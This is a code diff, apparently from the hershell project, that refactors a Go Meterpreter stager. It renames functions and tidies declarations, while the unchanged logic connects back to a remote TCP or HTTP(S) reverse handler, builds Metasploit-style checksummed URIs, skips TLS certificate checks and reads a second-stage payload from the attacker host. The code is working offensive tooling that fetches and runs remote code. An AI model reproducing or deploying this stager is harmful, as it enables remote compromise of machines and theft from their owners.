@@ -13,6 +13,8 @@ import (
 	"github.com/lesnuages/hershell/shell"
 )
 
+// Meterpreter function allows to connect back
+// to either a TCP or HTTP(S) reverse handler
 func Meterpreter(connType, address string) (bool, error) {
 	var (
 		ok  bool
@@ -20,9 +22,9 @@ func Meterpreter(connType, address string) (bool, error) {
 	)
 	switch {
 	case connType == "http" || connType == "https":
-		ok, err = ReverseHttp(connType, address)
+		ok, err = reverseHTTP(connType, address)
 	case connType == "tcp":
-		ok, err = ReverseTcp(address)
+		ok, err = reverseTCP(address)
 	default:
 		ok = false
 	}
@@ -30,8 +32,8 @@ func Meterpreter(connType, address string) (bool, error) {
 	return ok, err
 }
 
-func GetRandomString(length int, charset string) string {
-	var seed *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
+func getRandomString(length int, charset string) string {
+	seed := rand.New(rand.NewSource(time.Now().UnixNano()))
 	buf := make([]byte, length)
 	for i := range buf {
 		buf[i] = charset[seed.Intn(len(charset))]
@@ -40,7 +42,7 @@ func GetRandomString(length int, charset string) string {
 }
 
 // See https://github.com/rapid7/metasploit-framework/blob/7a6a124272b7c52177a540317c710f9a3ac925aa/lib/rex/payloads/meterpreter/uri_checksum.rb
-func GetURIChecksumId() int {
+func getURIChecksumID() int {
 	var res int = 0
 	switch runtime.GOOS {
 	case "windows":
@@ -53,28 +55,26 @@ func GetURIChecksumId() int {
 	return res
 }
 
-func GenerateURIChecksum(length int) string {
-	var charset string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
+func generateURIChecksum(length int) string {
+	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
 	for {
-		var checksum int = 0
-		var uriString string
-
-		uriString = GetRandomString(length, charset)
+		checksum := 0
+		uriString := getRandomString(length, charset)
 		for _, value := range uriString {
 			checksum += int(value)
 		}
-		if (checksum % 0x100) == GetURIChecksumId() {
+		if (checksum % 0x100) == getURIChecksumID() {
 			return uriString
 		}
 	}
 }
 
-func ReverseTcp(address string) (bool, error) {
+func reverseTCP(address string) (bool, error) {
 	var (
 		stage2LengthBuf []byte = make([]byte, 4)
 		tmpBuf          []byte = make([]byte, 2048)
-		read            int    = 0
-		totalRead       int    = 0
+		read                   = 0
+		totalRead              = 0
 		stage2LengthInt uint32 = 0
 		conn            net.Conn
 		err             error
@@ -106,12 +106,12 @@ func ReverseTcp(address string) (bool, error) {
 	return true, nil
 }
 
-func ReverseHttp(connType, address string) (bool, error) {
+func reverseHTTP(connType, address string) (bool, error) {
 	var (
 		resp *http.Response
 		err  error
 	)
-	url := connType + "://" + address + "/" + GenerateURIChecksum(12)
+	url := connType + "://" + address + "/" + generateURIChecksum(12)
 	if connType == "https" {
 		transport := &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
